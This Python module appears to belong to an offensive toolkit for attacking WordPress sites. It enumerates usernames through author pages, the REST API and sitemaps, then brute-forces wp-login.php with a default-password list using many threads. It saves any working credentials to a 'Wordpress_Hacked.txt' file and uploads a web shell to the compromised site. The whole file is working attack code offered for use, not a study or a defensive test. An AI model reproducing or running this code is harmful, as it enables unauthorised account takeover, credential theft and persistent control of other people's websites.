# coding=utf-8
import requests, re, threading, time, json
from Exploits import printModule
from Tools import shellupload

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0'}
passwords = open('files/DefaultPasswords_Wordpress.txt', 'r').read().splitlines()


class Wordpress(object):
    def __init__(self):
        self.flag = 0
        self.password = passwords

    def Run(self, site, users):
        try:
            thread = []
            for username in users:
                if self.flag == 1:
                    break
                for passwd in self.password:
                    t = threading.Thread(target=self.BruteForce,
                                         args=(site, passwd, username))
                    if self.flag == 1:
                        break
                    else:
                        t.start()
                        thread.append(t)
                        time.sleep(0.08)
                for j in thread:
                    j.join()
            if self.flag == 0:
                return printModule.returnNo(site, 'N/A', 'Wordpress Bruteforce', 'Wordpress')
            else:
                return printModule.returnYes(site, 'N/A', 'Wordpress Bruteforce', 'Wordpress')

        except:
            return printModule.returnNo(site, 'N/A', 'Wordpress Bruteforce', 'Wordpress')

    def UserName_Enumeration(self, site):
        users = []
        session = requests.session()
        for i in range(10):
            try:
                GETSource = session.get('http://' + site + '/?author={}'.format(str(i + 1)), timeout=7, headers=Headers)
                find = re.findall('/author/(.*)/"', str(GETSource.content))
                username = find[0]
                if '/feed' in str(username):
                    find = re.findall('/author/(.*)/feed/"', str(GETSource.content))
                    username2 = find[0]
                    users.append(str(username2))
                else:
                    users.append(str(username))
            except:
                pass
        if not len(users) == 0:
            pass
        else:
            for i in range(10):
                try:
                    GETSource2 = session.get('http://' + site + '/wp-json/wp/v2/users/' + str(i + 1), timeout=7,
                                             headers=Headers)
                    __InFo = json.loads(str(GETSource2.content))
                    if 'id' not in str(__InFo):
                        pass
                    else:
                        try:
                            users.append(str(__InFo['slug']))
                        except:
                            pass
                except:
                    pass
        if not len(users) == 0:
            pass
        else:
            try:
                GETSource3 = session.get('http://' + site + '/author-sitemap.xml', timeout=7, headers=Headers)
                yost = re.findall(r'(<loc>(.*?)</loc>)\s', GETSource3.content)
                for user in yost:
                    users.append(str(user[1].split('/')[4]))
            except:
                pass

        if not len(users) == 0:
            pass
        else:
            users.append('admin')
        return self.Run(site, users)


    def BruteForce(self, site, passwd, username):
        try:
            sess = requests.session()
            Headersz = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0'
            }
            sess.get('http://' + site + '', timeout=10, headers=Headersz)
            source = sess.get('http://' + site + '/wp-login.php', timeout=10, headers=Headersz).content
            WpSubmitValue = re.findall('class="button button-primary button-large" value="(.*)"', str(source))[0]
            WpRedirctTo = re.findall('name="redirect_to" value="(.*)"', str(source))[0]
            if 'Log In' in WpSubmitValue:
                WpSubmitValue = 'Log+In'
            else:
                WpSubmitValue = WpSubmitValue
            Headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Referer': 'http://{}'.format(site),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'http://{}'.format(site),
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1'
            }
            post = {
                'log': username,
                'pwd': passwd,
                'wp-submit': WpSubmitValue,
                'redirect_to': WpRedirctTo,
                'testcookie': '1'
            }
            url = site + '/wp-login.php'
            sess.post('http://' + url, data=post, headers=Headers, timeout=10)
            G = sess.get('http://' + site + '/wp-admin/', timeout=10, headers=Headersz)
            if '_logged' in str(sess.cookies) and 'dashboard' in str(G.content):
                with open('result/Wordpress_Hacked.txt', 'a') as writer:
                    writer.write('http://' + site + '/wp-login.php' + '\n Username: {}'.format(username) +
                                 '\n Password: ' + passwd + '\n-----------------------------------------\n')
                    shellupload.UploadshellWordpress(site, sess)
                self.flag = 1
        except:
            pass
